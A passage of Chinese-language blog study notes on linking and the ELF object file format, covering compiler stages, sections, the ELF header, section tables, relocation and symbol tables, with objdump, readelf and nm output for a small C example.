title="2.编译器在做什么"></a>2.编译器在做什么</h2><p>也就是上面我们说的第二步</p><p>它通常有6个过程</p><ol><li>扫描</li><li>语法分析</li><li>语义分析</li><li>源代码优化</li><li>代码生成</li><li>目标代码优化</li></ol><h3 id="2-1-词法分析"><a href="#2-1-词法分析" class="headerlink" title="2.1 词法分析"></a>2.1 词法分析</h3><p>首先源代码会被输入到扫描器中，扫描器简单地进行词法分析，运用一种类似于<strong>有限状态机</strong>地算法将源代码地字符序列分割成一系列地记号。</p><p>记号一般为：关键字、识别符、字面量（数字和字符串等）和特殊符号（加号和等号）。</p><h3 id="2-2-语法分析"><a href="#2-2-语法分析" class="headerlink" title="2.2 语法分析"></a>2.2 语法分析</h3><p><strong>语法分析器</strong>将对由扫描器产生的记号进行语法分析，<strong>从而产生语法树</strong></p><p>简单来说，语法分析器产生的语法树就是以<strong>表达式</strong>为节点的树</p><p>具体图可以看书</p><h3 id="2-3-语义分析"><a href="#2-3-语义分析" class="headerlink" title="2.3 语义分析"></a>2.3 语义分析</h3><p><strong>语义分析器</strong>进行语义分析</p><p>编译器所能分析的只是<strong>静态语义</strong>，与之所对应的<strong>动态语义</strong>，只有在运行过程中才可以确定</p><p>静态语义通常包括声明和类型的匹配，类型转换。</p><p>例如将浮点数赋值给指针很明显就是类型不匹配的。</p><p>经过语义分析之后，语法树上的表达式会被标识类型。</p><h3 id="2-4-中间语言生成"><a href="#2-4-中间语言生成" class="headerlink" title="2.4 中间语言生成"></a>2.4 中间语言生成</h3><p><strong>源码级优化器</strong>在不同编译器中会有所差别。</p><p>但作用是一样的，都是将整个语法树转换成中间代码。</p><p>中间代码·使得编译器生成前端和后端。前端负责产生机器无关的中间代码，编译器后端将中间代码转换成目标机器代码。</p><h3 id="2-5-目标代码生成与优化"><a href="#2-5-目标代码生成与优化" class="headerlink" title="2.5 目标代码生成与优化"></a>2.5 目标代码生成与优化</h3><p>编译器后端主要包括<strong>代码生成器</strong>和<strong>目标代码优化器</strong></p><p>代码生成器：将中间代码转换成机器代码，不同机器的不同字长、寄存器、整数数据类型、浮点数数据类型都会影响代码生成器。</p><p>我们经过以上步骤生成的代码全都是<strong>未经链接的目标代码</strong>，最终都需要通过链接器将目标文件链接起来产生可执行文件。</p><h2 id="3-链接器"><a href="#3-链接器" class="headerlink" title="3.链接器"></a>3.链接器</h2><p><strong>重定位</strong>：重新计算各个目标地址过程</p><p><strong>符号</strong>：用来表示一个地址，可能是一段子程序的起始地址，或一个变量的起始地址</p><h2 id="4-静态链接"><a href="#4-静态链接" class="headerlink" title="4.静态链接"></a>4.静态链接</h2><p>每个源码独立地编译，然后按照需要将他们组装起来，组装模块的过程叫做<strong>链接</strong>。</p><p>链接过程包括<strong>地址空间分配（Address and Storage Allocation）、符号决议（Symbol Resolution）和重定位（Relocation）</strong></p><blockquote><p>符号决议和符号绑定大体是差不多的，但决议用于静态链接，绑定用于动态链接</p></blockquote><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210207155541582.png" alt="image-20210207155541582"></p><p>如图所示，源代码文件编译成目标文件，<strong>目标文件和库一起链接成可执行文件</strong>。</p><blockquote><p>举个例子</p><p>在main.c中需要其他模块fun.c中的foo()</p><p>所以我们在main.c中每一处调用foo的时候都必须知道foo这个函数的地址，但由于是单独编译的</p><p>我们并不知道这个地址，若无链接器，我们需要手动修正地址</p><p>通过链接器我们可以直接引用foo而无需知道它的地址，因为链接器在链接的时候，会根据所引用的符号foo，自动去相应的模块查找foo的地址，并将main中foo的地址重新修正</p></blockquote><h1 id="0x02-目标文件"><a href="#0x02-目标文件" class="headerlink" title="0x02 目标文件"></a>0x02 目标文件</h1><p>我们上面已经知道源代码经过预处理，编译，汇编产生的文件就叫<strong>目标文件</strong>。</p><p>目标文件其实是已经编译后的可执行文件，只是有些符号和地址未被调整，本身就是按照可执行文件格式存储的，但和真正可执行文件还有所不同。</p><p>可以先来看一下</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210207161220722.png" alt="image-20210207161220722"></p><p>下面我们将讲这个文件到底是什么</p><h2 id="1-目标文件的格式"><a href="#1-目标文件的格式" class="headerlink" title="1.目标文件的格式"></a>1.目标文件的格式</h2><p>我们熟知的windows下的PE（Portable Executable）和Linux的ELF（Executable Linkable Format）的是可执行文件</p><p>目标文件就是源代码编译后但未进行链接的中间文件。它与可执行文件的内容和结构很相似，所以一般跟可执行文件格式一起用一种格式存储。</p><p>此外，还有其他可执行文件格式OMF（Object Module Format）和Unix a.out格式和MS-DOS.COM格式等。</p><p><strong>动态链接库</strong>（Dynamic Linking Library）（windows下的dll和linux中的so）及<strong>静态链接库</strong>（Static Linking Libary）（windows下的lib和Linux中的a）都按照可执行文件格式存储</p><p>静态链接库是一个包含有很多目标文件的文件包</p><p>文件格式如下</p><div class="table-container"><table><thead><tr><th style="text-align:left">ELF文件类型</th><th>说明</th><th>实例</th></tr></thead><tbody><tr><td style="text-align:left">重定位文件(Relocatable File)</td><td>包含代码和数据，可以被链接成可执行文件或目标文件</td><td>Linux中.o Win下的obj</td></tr><tr><td style="text-align:left">可执行文件(Executable File)</td><td>可以执行的程序,通常无扩展名</td><td>Linux中.out Win下的.exe</td></tr><tr><td style="text-align:left">共享目标文件(Shared Object File)</td><td>包含代码和数据，有两种情况。第一种是链接器可以使用这种文件跟其他的重定位文件和共享目标文件进行链接产生<strong>新的目标文件</strong>。第二种事动态链接器可以将几个共享目标文件与可执行文件结合，作为进程映像的一部分来运行</td><td>Linux中.so和Win中DLL</td></tr><tr><td style="text-align:left">核心转储文件(Core Dump File)</td><td>当进程意外终止时，系统可以将该进程的地址空间的内容及终止时的一些其他信息转储到核心转储文件</td><td>Linux中的Core Dump</td></tr></tbody></table></div><blockquote><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210208204903438.png" alt="image-20210208204903438"></p></blockquote><h2 id="2-目标文件是什么样的"><a href="#2-目标文件是什么样的" class="headerlink" title="2.目标文件是什么样的"></a>2.目标文件是什么样的</h2><p>目标文件除了机器指令代码、数据，还包括了链接时所需要的一些信息，比如符号表、调试信息和符号串等。</p><p>目标文件通常将这些信息按不同的属性，以<strong>节</strong>（Section）来存储，也叫<strong>段</strong>（Segment）</p><p>我们熟知的代码段、数据段就是这个东西</p><p><strong>代码段</strong>存储代码叫<code>.code</code>或<code>.text</code></p><p><strong>数据段</strong>存储全局变量和局部静态变量叫<code>.data</code></p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210208205643721.png" alt="image-20210208205643721"></p><blockquote><p>从这个图中可以看到，ELF文件的开头是一个文件头，<strong>它描述了整个文件的文件属性，包括文件是否可执行、是静态链接还是动态链接、目标硬件、目标操作系统等各种信息</strong></p><p>此外，文件头还有一个<strong>段表</strong>，</p><p>段表是一个描述<strong>文件中各个段的数组</strong>。段表描述了文件中各个段在文件中的偏移位置以及段的属性等，从段里面可以得到每个段的所有信息。</p><p>文件头之后就是各个段的内容</p></blockquote><p><code>.text</code>：存储c语言编译后的执行语句编译成的机器代码</p><p><code>.data</code>：存储已初始化的全局变量和局部静态变量</p><p><code>.bss</code>：存储未初始化的全局变量和局部静态变量</p><blockquote><p>那么为什么要设置bss段呢？</p><p>在程序中，未初始化的变量是0，如果把他们放在data段并分配空间赋值0是完全浪费空间的一种做法，</p><p>所以可执行文件为了记录所有未初始化的全局变量和局部静态变量的大小总和，记做bss段</p><p><strong>bss段只是为未初始化的全局变量和局部静态变量预留位置而已，并没有内容，在文件中也不占空间</strong></p></blockquote><p><strong>总体来说，程序源代码被编译以后主要分成两种段：程序指令和程序数据。代码段属于程序指令，而数据段和bss段属于程序数据。</strong></p><h2 id="3-挖掘SimpleSection-o"><a href="#3-挖掘SimpleSection-o" class="headerlink" title="3.挖掘SimpleSection.o"></a>3.挖掘SimpleSection.o</h2><p>这里我们换成a.o</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> global_init_var = <span class="number">84</span>;</span><br><span class="line"><span class="keyword">int</span> global_uninit_var;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func1</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> static_var = <span class="number">85</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> static_var2;</span><br><span class="line"><span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> b;</span><br><span class="line">func1(static_var + static_var2 + a + b);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译一下</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210209161901015.png" alt="image-20210209161901015"></p><p>现在我们来具体分析一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -h a.o</span><br><span class="line">&#x2F;&#x2F;-h将基本信息打印出来</span><br><span class="line">&#x2F;&#x2F;-x打印更多信息</span><br></pre></td></tr></table></figure><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210209162052499.png" alt="image-20210209162052499"></p><blockquote><p>代码段，数据段，bss段我们已经知道了</p><p>可以看到还有<strong>只读数据段</strong><code>.rodata</code> <strong>注释段</strong><code>.comment</code> <strong>堆栈提示段</strong><code>.note.GNU-stack</code>段</p><p>下面第二行CONTENTS ALLOC表示段的各种属性，CONTENTS表示该段在文件中存在</p><p>看到BSS段是没有CONTENTS表示它实际在ELF文件中不存在内容</p><p>下面我们就来看一下各个段的分布</p></blockquote><p>这里和书上不同的是<code>.note.GNU-stack</code>占了内容，那么我们也把他写上</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210209163804417.png" alt="image-20210209163804417"></p><h3 id="3-1-代码段"><a href="#3-1-代码段" class="headerlink" title="3.1 代码段"></a>3.1 代码段</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -s -d a.o</span><br><span class="line">&#x2F;&#x2F;-s 将段内容按照16进制打印</span><br><span class="line">&#x2F;&#x2F;-d 可以将所有包含指令的段反汇编</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">a.o：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line">Contents of section .text:</span><br><span class="line"> 0000 5589e583 ec0883ec 08ff7508 68000000  U.........u.h...</span><br><span class="line"> 0010 00e8fcff ffff83c4 1090c9c3 8d4c2404  .............L$.</span><br><span class="line"> 0020 83e4f0ff 71fc5589 e55183ec 14c745f0  ....q.U..Q....E.</span><br><span class="line"> 0030 01000000 8b150400 0000a100 00000001  ................</span><br><span class="line"> 0040 c28b45f0 01c28b45 f401d083 ec0c50e8  ..E....E......P.</span><br><span class="line"> 0050 fcffffff 83c410b8 00000000 8b4dfcc9  .............M..</span><br><span class="line"> 0060 8d61fcc3                             .a..            </span><br><span class="line">Contents of section .data:</span><br><span class="line"> 0000 54000000 55000000                    T...U...        </span><br><span class="line">Contents of section .rodata:</span><br><span class="line"> 0000 25640a00                             %d..            </span><br><span class="line">Contents of section .comment:</span><br><span class="line"> 0000 00474343 3a202855 62756e74 7520352e  .GCC: (Ubuntu 5.</span><br><span class="line"> 0010 342e302d 36756275 6e747531 7e31362e  4.0-6ubuntu1~16.</span><br><span class="line"> 0020 30342e31 32292035 2e342e30 20323031  04.12) 5.4.0 201</span><br><span class="line"> 0030 36303630 3900                        60609.          </span><br><span class="line">Contents of section .eh_frame:</span><br><span class="line"> 0000 14000000 00000000 017a5200 017c0801  .........zR..|..</span><br><span class="line"> 0010 1b0c0404 88010000 1c000000 1c000000  ................</span><br><span class="line"> 0020 00000000 1c000000 00410e08 8502420d  .........A....B.</span><br><span class="line"> 0030 0558c50c 04040000 28000000 3c000000  .X......(...&lt;...</span><br><span class="line"> 0040 1c000000 48000000 00440c01 00471005  ....H....D...G..</span><br><span class="line"> 0050 02750043 0f03757c 06750c01 0041c543  .u.C..u|.u...A.C</span><br><span class="line"> 0060 0c040400                             ....            </span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;func1&gt;:</span><br><span class="line">   0:55                   push   %ebp</span><br><span class="line">   1:89 e5                mov    %esp,%ebp</span><br><span class="line">   3:83 ec 08             sub    $0x8,%esp</span><br><span class="line">   6:83 ec 08             sub    $0x8,%esp</span><br><span class="line">   9:ff 75 08             pushl  0x8(%ebp)</span><br><span class="line">   c:68 00 00 00 00       push   $0x0</span><br><span class="line">  11:e8 fc ff ff ff       call   12 &lt;func1+0x12&gt;</span><br><span class="line">  16:83 c4 10             add    $0x10,%esp</span><br><span class="line">  19:90                   nop</span><br><span class="line">  1a:c9                   leave  </span><br><span class="line">  1b:c3                   ret    </span><br><span class="line"></span><br><span class="line">0000001c &lt;main&gt;:</span><br><span class="line">  1c:8d 4c 24 04          lea    0x4(%esp),%ecx</span><br><span class="line">  20:83 e4 f0             and    $0xfffffff0,%esp</span><br><span class="line">  23:ff 71 fc             pushl  -0x4(%ecx)</span><br><span class="line">  26:55                   push   %ebp</span><br><span class="line">  27:89 e5                mov    %esp,%ebp</span><br><span class="line">  29:51                   push   %ecx</span><br><span class="line">  2a:83 ec 14             sub    $0x14,%esp</span><br><span class="line">  2d:c7 45 f0 01 00 00 00 movl   $0x1,-0x10(%ebp)</span><br><span class="line">  34:8b 15 04 00 00 00    mov    0x4,%edx</span><br><span class="line">  3a:a1 00 00 00 00       mov    0x0,%eax</span><br><span class="line">  3f:01 c2                add    %eax,%edx</span><br><span class="line">  41:8b 45 f0             mov    -0x10(%ebp),%eax</span><br><span class="line">  44:01 c2                add    %eax,%edx</span><br><span class="line">  46:8b 45 f4             mov    -0xc(%ebp),%eax</span><br><span class="line">  49:01 d0                add    %edx,%eax</span><br><span class="line">  4b:83 ec 0c             sub    $0xc,%esp</span><br><span class="line">  4e:50                   push   %eax</span><br><span class="line">  4f:e8 fc ff ff ff       call   50 &lt;main+0x34&gt;</span><br><span class="line">  54:83 c4 10             add    $0x10,%esp</span><br><span class="line">  57:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  5c:8b 4d fc             mov    -0x4(%ebp),%ecx</span><br><span class="line">  5f:c9                   leave  </span><br><span class="line">  60:8d 61 fc             lea    -0x4(%ecx),%esp</span><br><span class="line">  63:c3                   ret</span><br></pre></td></tr></table></figure><blockquote><p>通过上面这段代码</p><p>我们对文件内容有了更深入的了解</p><p>最左面是偏移量，中间是16进制内容，右面是ascii形式</p><p>反汇编结果我们也很熟悉</p></blockquote><h3 id="3-2-数据段和只读数据段"><a href="#3-2-数据段和只读数据段" class="headerlink" title="3.2 数据段和只读数据段"></a>3.2 数据段和只读数据段</h3><p><code>.data</code>段保存<strong>已经初始化了的全局静态变量和局部静态变量</strong>,所以上面程序中<code>.data</code>是八个字节</p><p><code>.rodata</code>存放只读数据，一般是程序里面的只读变量和字符串常量，例如上面中<code>printf</code>的参数<code>%d\n\0</code>是四个字节</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Contents of section .data:</span><br><span class="line"> 0000 54000000 55000000                    T...U...        </span><br><span class="line">Contents of section .rodata:</span><br><span class="line"> 0000 25640a00                             %d..</span><br></pre></td></tr></table></figure><blockquote><p>也可以看出<code>.data</code>是84 85从低到高是0x54 0x00 0x00 0x00</p><p><code>.rodata</code>是%d\n\0</p></blockquote><h3 id="3-3-BSS段"><a href="#3-3-BSS段" class="headerlink" title="3.3 BSS段"></a>3.3 BSS段</h3><p><code>.bss</code>段存储<strong>未初始化的全局变量和局部静态变量</strong>。</p><h3 id="3-4-其他段"><a href="#3-4-其他段" class="headerlink" title="3.4 其他段"></a>3.4 其他段</h3><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210140348425.png" alt="image-20210210140348425"></p><p>这些段都是由.来做前缀，说明这些表的名字是系统保留的。我们可以自定义段名，并在文件中插入这个段，达到自己想干的事情。</p><blockquote><p>将一个二进制文件如图片，音乐作为目标文件的一个段</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objcopy -I binary -O elf32-i386 -B i386 image.jpg image.o</span><br><span class="line">objdump -ht image.o</span><br></pre></td></tr></table></figure><h2 id="4-ELF文件结构描述"><a href="#4-ELF文件结构描述" class="headerlink" title="4.ELF文件结构描述"></a>4.ELF文件结构描述</h2><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210141207866.png" alt="image-20210210141207866"></p><p>ELF目标文件格式最前面是<strong>ELF文件头</strong>，包含整个文件的基本属性，如ELF文件版本、目标机器型号、程序入口地址等。</p><p>在ELF文件中与段有关的重要结构就是段表(Section Hearder Table)，该表描述了ELF文件包含的所有段的信息，如每个段的段名、段的长度、在文件中的偏移和读写权限等。</p><h3 id="4-1-文件头"><a href="#4-1-文件头" class="headerlink" title="4.1 文件头"></a>4.1 文件头</h3><p>查看ELF文件</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210141759681.png" alt="image-20210210141759681"></p><p>ELF头中包括了<strong>魔数，文件机器字节长度、数据存储方式、版本、运行平台、ABI版本、重定位类型、硬件平台、平台版本、入口地址、程序头入口和长度、段表位置和长度及段的数量</strong></p><p>为了更好定义各个成员大小、elf.h有一套自己变量体系</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210142310041.png" alt="image-20210210142310041"></p><p>下面来看一下“Elf32_Ehdr”这个结构体</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210142459097.png" alt="image-20210210142459097"></p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210142507074.png" alt="image-20210210142507074"></p><p>之后我们来对照一下</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210142536099.png" alt="image-20210210142536099"></p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210142548337.png" alt="image-20210210142548337"></p><p>这里具体来说一下魔数</p><p><strong>魔数</strong>：</p><p>ELF的魔数上面我们可以看到是16字节，也就是对应的16个数组</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210142844872.png" alt="image-20210210142844872"></p><p>最开始的4个字节是ELF文件必须相同的标识码</p><p>为0x7F 0x45 0x4C 0x46 7F是ascii中的DEL控制符，45 4c 46分别是ascii中的ELF。几乎所有可执行文件格式开始都是魔数，如a.out的0x01 0x07，PE中的0x4d 0x5a。</p><p>那么魔数是来干什么的？模式是用来确认文件的类型，操作系统在加载可执行文件的时候会确认魔数是否正确，如果不正确将会拒绝加载。</p><p>下一个字节是0x01表示32位 0x02表示64位 </p><p>第6个字节序 规定是大端还是小端</p><p>第7个是主版本号，一般为1。后面的9个一般填0</p><p><strong>文件类型</strong></p><p>e_type成员表示文件类型，就是前面说的三种文件类型。</p><p>操作系统通过这个来判断ELF文件类型，而不是通过后缀名。</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210143702078.png" alt="image-20210210143702078"></p><h3 id="4-2-段表"><a href="#4-2-段表" class="headerlink" title="4.2 段表"></a>4.2 段表</h3><p><strong>段表（Section Header Table）</strong>是保存这些段的基本属性的结构。</p><p>可以说，ELF文件的段结构就是由段表来决定的，编译器、链接器、和装载器都是依靠段表来定位和访问各个段的属性的。</p><p>段表由ELF文件头的<code>e_shoff</code>成员决定。</p><p>下面我们来看一下真正的段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -S a.o</span><br><span class="line">&#x2F;&#x2F;各个段</span><br></pre></td></tr></table></figure><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210144604296.png" alt="image-20210210144604296"></p><p>每个段都是以<code>Elf32_Shdr</code>结构体，因此<code>Elf32_Shdr</code>又叫做<strong>段描述符</strong></p><p>所以上面就是有13个结构体，此外第一个是无用的，所以只有12个有效段。</p><p>可以来看一下<code>Elf32_Shdr</code></p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210144945550.png" alt="image-20210210144945550"></p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210145159772.png" alt="image-20210210145159772"></p><p><strong>段的类型</strong></p><p>段的名字只在链接和编译中有意义，但不能真正表示段的类型。</p><p>对于编译器和链接器来说，<strong>主要决定段的属性是段的类型（sh_type）和段的标志位(sh_flags)</strong></p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210145930584.png" alt="image-20210210145930584"></p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210145922440.png" alt="image-20210210145922440"></p><p><strong>段的标志位</strong></p><p>段的标志位表示该段在进程虚拟地址空间中的属性，如是否可写可执行等。</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210150400718.png" alt="image-20210210150400718"></p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210150408040.png" alt="image-20210210150408040"></p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210150429555.png" alt="image-20210210150429555"></p><p><strong>段的链接信息</strong></p><p>如果段类型是与链接相关的，如重定位表、符号表等，那么sh_link和sh_info是有意义的</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210150637999.png" alt="image-20210210150637999"></p><h3 id="4-3-重定位表"><a href="#4-3-重定位表" class="headerlink" title="4.3 重定位表"></a>4.3 重定位表</h3><p>链接器在处理目标文件时，需要对目标文件中某些部位进行重定位，即代码段和数据段中那些对绝对地址引用的位置。这些重定位记录都会记录在重定位表里。</p><p><code>.rel.text</code>就是一个重定位表。</p><p><strong>每个重定位的段都会有一个相应的重定位的表</strong>。</p><p>如<code>.text</code>中有<code>printf</code>的调用，所以就会有<code>.rel.text</code>而<code>.data</code>就没有重定位的。</p><p>重定位表同时也是ELF的一个段，所以这个段的类型就是<code>SHT_REL</code>类型。<code>sh_link</code>就是符号表的下标，<code>sh_info</code>就是作用于哪个段。</p><hr><h3 id="4-4-字符串表"><a href="#4-4-字符串表" class="headerlink" title="4.4 字符串表"></a>4.4 字符串表</h3><p>字符串由于比较复杂，所以把字符串集中在一个表里就很简便，然后用偏移来表示字符串。</p><h2 id="5-符号"><a href="#5-符号" class="headerlink" title="5.符号"></a>5.符号</h2><p>在链接中，目标文件中间相互拼合实际上是目标文件之间对地址的引用。即对函数和变量的地址的引用。</p><p>如目标文件B用目标文件A中foo函数，那么就是目标文件A<strong>定义了foo</strong>，目标文件B<strong>引用了foo</strong>。</p><p>在链接中，我们将函数和变量统称为<strong>符号</strong>，函数名和变量名为<strong>符号名</strong></p><p><strong>在链接过程中很关键就是符号的管理，每一个目标文件都会有一个相应的符号表，这个表里面记录了目标文件用到的所有符号。每个定义的符号有一个对应的值叫符号值，符号值就是地址。</strong></p><p>具体符号有下面几种类型</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210153736035.png" alt="image-20210210153736035"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ nm a.o</span><br><span class="line">&#x2F;&#x2F;看符号</span><br></pre></td></tr></table></figure><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210203929970.png" alt="image-20210210203929970"></p><h3 id="5-1-ELF符号表结构"><a href="#5-1-ELF符号表结构" class="headerlink" title="5.1 ELF符号表结构"></a>5.1 ELF符号表结构</h3><p>ELF文件中符号表往往是一个段，一般叫做<code>.symtab</code>。符号表的结构是一个ELF32_Sym结构的数组，每个结构都是一个符号。</p><p>Elf32_Sym的结构定义</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210204148472.png" alt="image-20210210204148472"></p><p>成员意义如下图</p><p><img src="/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/image-20210210204233887.png" 